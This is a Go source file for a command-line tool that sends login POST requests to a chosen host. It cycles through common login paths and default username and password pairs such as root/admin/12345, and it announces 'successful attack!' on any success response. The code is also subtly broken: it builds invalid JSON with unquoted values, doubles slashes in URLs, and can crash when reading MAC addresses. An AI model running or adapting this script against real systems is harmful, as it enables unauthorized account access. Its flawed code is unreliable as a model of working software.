package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"time"
)

// most used endpoints for logging in
var endpoints = []string{
	"/",
	"/auth",
	"/login",
	"/auth/login",
	"/users/login",
	"/user/login",
	"/auth/user/login",
	"/auth/users/login",
}

type credential struct {
	username  string
	passwords []string
}

var credentials = []credential{
	{
		username: "root",
		passwords: []string{
			"12345",
			"",
			"admin",
			"root",
			time.Now().String(),
			getMacAddr(),
		},
	},
	{
		username: "admin",
		passwords: []string{
			"12345",
			"",
			"admin",
			"root",
			time.Now().String(),
			getMacAddr(),
		},
	},
	{
		username: "system",
		passwords: []string{
			"12345",
			"",
			"admin",
			"root",
			time.Now().String(),
			getMacAddr(),
		},
	},
}

func getMacAddr() string {
	ifas, err := net.Interfaces()
	if err != nil {
		return " "
	}

	var as []string
	for _, ifa := range ifas {
		a := ifa.HardwareAddr.String()
		if a != "" {
			as = append(as, a)
		}
	}

	return as[0]
}

func sendPostRequest(url string, body []byte) (bool, error) {
	log.Println("URL:> ", url)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}

	resp, err := client.Do(req)
	if err != nil {
		return false, fmt.Errorf("failed to send request: %w", err)
	}

	defer resp.Body.Close()

	fmt.Println("response Status:", resp.Status)
	fmt.Println("response Headers:", resp.Header)

	respBody, _ := io.ReadAll(resp.Body)

	fmt.Println("response Body:", string(respBody))

	return resp.StatusCode >= 200 && resp.StatusCode < 300, nil
}

func main() {
	var (
		hostFlag = flag.String("host", "localhost", "target host address")
	)

	flag.Parse()

	for _, endpoint := range endpoints {
		url := fmt.Sprintf("%s/%s", *hostFlag, endpoint)

		for _, crd := range credentials {
			for _, pass := range crd.passwords {
				body := []byte(fmt.Sprintf(`{"username":%s,"password":%s}`, crd.username, pass))

				result, err := sendPostRequest(url, body)
				if err != nil {
					log.Println(err)

					continue
				}

				if result {
					log.Println("successful attack!")

					os.Exit(0)
				}
			}
		}
	}

	os.Exit(1)
}
